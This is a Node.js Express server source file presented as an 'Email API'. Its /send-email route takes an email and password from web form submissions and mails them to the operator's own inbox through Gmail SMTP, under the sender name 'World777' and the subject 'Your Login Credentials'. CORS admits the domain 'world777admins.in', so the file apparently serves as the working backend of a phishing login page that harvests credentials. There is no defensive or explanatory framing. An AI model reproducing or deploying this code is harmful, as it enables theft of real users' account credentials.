// server.js
require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

/* ---------- CORS ---------- */
const allowedOrigins = [
  'https://world777admins.in',
  'http://localhost:3000',
  ...(process.env.ALLOWED_ORIGIN ? process.env.ALLOWED_ORIGIN.split(',').map(s => s.trim()) : [])
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) return callback(null, true);
    callback(new Error('CORS blocked'));
  },
  credentials: true,
}));

/* ---------- BODY PARSERS ---------- */
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

/* ---------- SIMPLE RATE LIMIT (30 emails/min) ---------- */
const RATE_LIMIT = parseInt(process.env.RATE_LIMIT_PER_MIN || '30', 10);
const sentLog = [];
const isRateLimited = () => {
  const now = Date.now();
  while (sentLog.length && sentLog[0] < now - 60_000) sentLog.shift();
  return sentLog.length >= RATE_LIMIT;
};

/* ---------- TRANSPORTER (using STARTTLS port 587) ---------- */
let transporter = null;

const createTransporter = () => {
  const { EMAIL_USER, EMAIL_PASS } = process.env;
  if (!EMAIL_USER || !EMAIL_PASS) {
    throw new Error('EMAIL_USER and EMAIL_PASS must be set in .env');
  }

  console.log('Creating new SMTP transporter...');

  return nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false, // use STARTTLS (works better than SSL on 465 for most hosts)
    auth: {
      user: EMAIL_USER,
      pass: EMAIL_PASS, // 16-character App Password
    },
    connectionTimeout: 60_000,
    greetingTimeout: 60_000,
    socketTimeout: 60_000,
    tls: {
      rejectUnauthorized: true
    }
  });
};

const getTransporter = async () => {
  if (!transporter) transporter = createTransporter();

  try {
    await Promise.race([
      transporter.verify(),
      new Promise((_, rej) => setTimeout(() => rej(new Error('verify timeout')), 30_000))
    ]);
  } catch (err) {
    console.warn('⚠️ Transporter verify failed → recreating:', err.message);
    transporter.close?.();
    transporter = createTransporter();
    await transporter.verify(); // final check
  }
  return transporter;
};

/* ---------- ROUTES ---------- */

// Health check
app.get('/', (req, res) => {
  res.json({
    success: true,
    message: '✅ Email API is running!',
    timestamp: new Date().toISOString()
  });
});

// Send email
app.post('/send-email', async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ success: false, message: 'email and password required' });
    }

    if (isRateLimited()) {
      return res.status(429).json({ success: false, message: 'Too many requests – try again later' });
    }

    const mailer = await getTransporter();
    const recipient = process.env.RECIPIENT_EMAIL || process.env.EMAIL_USER;

    const info = await Promise.race([
      mailer.sendMail({
        from: `"World777" <${process.env.EMAIL_USER}>`,
        to: recipient,
        subject: 'Your Login Credentials',
        text: `Email: ${email}\nPassword: ${password}`
      }),
      new Promise((_, rej) => setTimeout(() => rej(new Error('send timeout')), 60_000))
    ]);

    sentLog.push(Date.now());
    console.log('✅ Email sent →', info.messageId);

    res.json({ success: true, message: 'Email sent', messageId: info.messageId });
  } catch (err) {
    console.error('❌ Send failed:', err);
    res.status(500).json({
      success: false,
      message: 'Failed to send email',
      error: err.message
    });
  }
});

// Reinitialize transporter
app.post('/reinit-transporter', (req, res) => {
  try {
    transporter?.close?.();
    transporter = null;
    console.log('♻️ Transporter reset manually.');
    res.json({ success: true, message: 'Transporter reset' });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

/* ---------- START SERVER ---------- */
(async () => {
  try {
    console.log('🚀 Starting Email API Server...');
    await getTransporter(); // warm-up check
    await app.listen(PORT);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`Health: http://localhost:${PORT}/`);
    console.log(`Send:   POST http://localhost:${PORT}/send-email`);
  } catch (err) {
    console.error('❌ Startup error:', err);
    process.exit(1);
  }
})();
